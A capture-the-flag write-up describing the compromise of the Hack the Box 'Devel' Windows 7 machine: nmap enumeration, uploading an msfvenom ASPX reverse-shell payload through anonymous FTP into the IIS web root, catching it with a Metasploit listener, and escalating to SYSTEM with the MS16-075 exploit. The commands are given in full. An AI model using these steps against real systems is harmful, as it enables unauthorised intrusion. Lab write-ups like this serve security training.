# Machine: Devel

## Overview

This write-up details my approach to compromising the "Devel" machine on Hack the Box. The Devel machine is a Windows 7 Enterprise system running an IIS web server and an FTP server with anonymous login enabled. Below are the steps I followed to successfully exploit the machine and obtain the necessary flags.

## Steps to Compromise the Machine

### 1. Enumerating

Initial Nmap Scan:

```bash
nmap -sS -p- -v <IP> -oN full_tcp_scan.txt
```

The scan revealed two open ports:

```
21/tcp: FTP (Microsoft ftpd, anonymous login allowed)
80/tcp: HTTP (Microsoft IIS httpd 7.5)
```

Service and Version Scan:

```bash
nmap -sV -sC -p21,80 <IP> -oN ports_scan.txt -oX ports_scan.xml -v
```

The detailed scan provided the following information:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 06-13-24  11:42AM                  698 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

The target was identified as a Windows machine running IIS web server version 7.5 and an FTP server with anonymous login enabled.

### 2. Gaining Access

At first, I accessed the FTP server and confirmed it was the IIS web root path by modifying the iisstart.htm file.

I Generate an ASPX Payload and put in FTP root path:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<MY IP> LPORT=<PORT> -f aspx -o shell.aspx
ftp <IP>
put shell.aspx
```

I started a metasploit listener

```bash
use exploit/multi/handler
set PAYLOAD windows/shell_reverse_tcp
set LPORT 80
run
```

And I trigged the payload from my browser and I got the shell and I was iis apppool\web an unprivilege user.

### 3. Privilege Escalation

Using Metasploit post module to Suggest Exploits to elevate my privileges:

```bash
use post/multi/recon/local_exploit_suggester
run
```

I found and executed the exploit/windows/local/ms16_075_reflection_juicy exploit to escalate privileges to NT AUTHORITY\SYSTEM.

## Flag Capture:

Located and captured the user and root flags.

## Conclusion

Compromising the Devel machine involved identifying open ports, accessing the FTP server to upload a web shell, and exploiting the system using a combination of reverse shells and privilege escalation techniques. This exercise reinforced key concepts in web server exploitation and privilege escalation on Windows systems.

***
